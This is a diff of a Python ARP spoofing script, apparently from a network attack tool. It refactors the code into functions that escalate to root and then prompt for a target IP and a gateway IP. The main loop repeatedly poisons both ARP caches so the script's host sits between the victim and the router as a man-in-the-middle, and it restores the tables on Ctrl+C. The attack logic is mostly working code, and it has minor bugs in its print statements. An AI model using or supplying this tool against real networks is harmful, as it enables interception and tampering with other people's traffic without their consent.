@@ -3,14 +3,15 @@ import os
 import sys
 import time
 
-euid = os.geteuid()
-if euid != 0:
-    print("Script not started as root. Running sudo..")
-    args = ['sudo', sys.executable] + sys.argv + [os.environ]
-    os.execlpe('sudo', *args)
+def become_root():
+    euid = os.geteuid()
+    if euid != 0:
+        print("Script not started as root. Running sudo..")
+        args = ['sudo', sys.executable] + sys.argv + [os.environ]
+        os.execlpe('sudo', *args)
 
-print('Running. Your euid is', + euid)
-print("---------------------------------------------------------")
+    print('Running. Your euid is', + euid)
+    print("---------------------------------------------------------")
 
 
 # def _enable_linux_iproute():
@@ -50,17 +51,21 @@ def restore(destination_ip, source_ip):
 
 #  sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 sent_packets = 0
-target_ip = "192.168.0.111"
-gateway_ip = "192.168.0.1"
-try:
-    while True:
-        spoof(target_ip, gateway_ip)  # Tell the target that we are the router
-        spoof(gateway_ip, target_ip)  # Tell the router that we are the target
-        sent_packets = sent_packets + 2
-        print("\r[+] Packets Sent {}" + str(sent_packets))
-        sys.stdout.flush()
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[+] Keyboard Interrupt CTRL + C Detected...Restoring ARP tables...")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+def run_spoof():
+    global sent_packets
+    become_root()
+    target_ip = raw_input("Enter the target ip you want to spoof: ")
+    gateway_ip = raw_input("\nEnter the IP address of the Gateway: ")
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)  # Tell the target that we are the router
+            spoof(gateway_ip, target_ip)  # Tell the router that we are the target
+            sent_packets = sent_packets + 2
+            print("\r[+] Packets Sent {}" + str(sent_packets))
+            sys.stdout.flush()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+] Keyboard Interrupt CTRL + C Detected...Restoring ARP tables...")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+
